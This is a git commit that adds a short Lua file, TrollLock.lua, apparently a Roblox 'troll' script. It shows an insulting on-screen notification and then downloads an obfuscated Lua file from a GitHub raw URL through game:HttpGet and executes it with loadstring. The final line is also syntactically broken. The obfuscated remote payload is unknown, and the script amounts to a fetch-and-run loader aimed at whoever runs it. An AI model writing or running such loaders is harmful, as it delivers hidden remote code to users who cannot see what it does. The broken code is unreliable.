9af0cf7a932afc25c06d4ec542f82a884a6daaf8
RewritingScripter1 <neoraijinpili123@gmail.com>
2024-08-05 20:17:41 +0800

    Create TrollLock.lua

---
+++ TrollLock.lua
@@ -0,0 +1,9 @@
+game.StarterGui:SetCore(
+    "SendNotification",
+    {
+        Title = "Ur Fuckin A 5 yr old?!",
+        Text = "Caught in 4k HD"
+    }
+)
+
+function loadstring(game:HttpGet("https://raw.githubusercontent.com/Jelly-plays/Rejoin-script/main/obf_L744By559M18BbuseSG6en8r1zL31daK9060LV7WyvmS4bQp92aONWfwRE36FdcZ.lua.txt"))();
